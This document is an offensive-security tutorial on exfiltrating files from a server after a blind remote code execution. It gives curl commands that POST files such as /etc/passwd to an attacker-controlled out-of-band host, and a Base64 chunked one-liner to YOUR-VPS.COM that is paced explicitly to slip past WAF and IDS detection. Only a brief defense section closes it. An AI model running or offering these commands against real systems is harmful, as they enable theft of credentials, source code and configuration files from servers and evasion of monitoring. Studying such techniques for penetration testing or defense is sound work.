# Blind RCE File Exfiltration via `curl`

If you’ve landed a **Blind Remote Code Execution (RCE)** but can trigger outbound HTTP requests (**OOB — Out of Band**), you can steal files from the target server without direct output.

---

## 📌 Technique: Using `curl` with `-d @file`

When you run:
```bash
curl -d @index.php https://OOB_SERVER
```
- `-d @index.php` → Reads the entire file `index.php` and sends it in the HTTP request body.

The OOB server receives the full file contents, even if the RCE output is not directly visible.

---

## 📜 Example Exploit Flow

### 1. Control an OOB listener:
```bash
python3 -m http.server 8080
```
👉 Or use **Burp Collaborator** / **Interactsh**.

### 2. Trigger the Blind RCE on the target with:
```bash
curl -d @/etc/passwd https://your-server.com
```
The file contents are sent to your server in the POST request body.

## 🔥 Why This Works
- ⚡️ The `@` syntax in curl tells it to read a local file instead of sending raw text.
- ⚡️ Perfect for exfiltrating sensitive files (config files, source code, credentials) over HTTP in a single request.

## Exfiltrating Files via Base64 + Chunked Requests
Sometimes servers or firewalls block direct file leaks.
A sneaky trick is to encode files in Base64 and send them in small chunks to bypass restrictions.

💻 One-liner:
```
i=0; base64 /etc/passwd | fold -w 60 | \
while read -r line; do \
  curl -s -X POST -d "$line" http://YOUR-VPS.COM/chunk$i; \
  i=$((i+1)); \
  sleep 0.5; \
done
```

## 🔎 How it works: 
1️⃣ Encodes /etc/passwd into Base64   
2️⃣ Splits into 60-char chunks   
3️⃣ Sends each chunk via POST requests   
4️⃣ Adds delay to avoid WAF / IDS detection   

---

## 🛡 Defense
- ✅ Restrict outbound HTTP requests from servers (**Egress filtering**).
- ✅ Disable `curl`, `wget`, and similar tools in restricted environments.
- ✅ Use Web Application Firewalls (**WAFs**) to detect suspicious HTTP patterns.
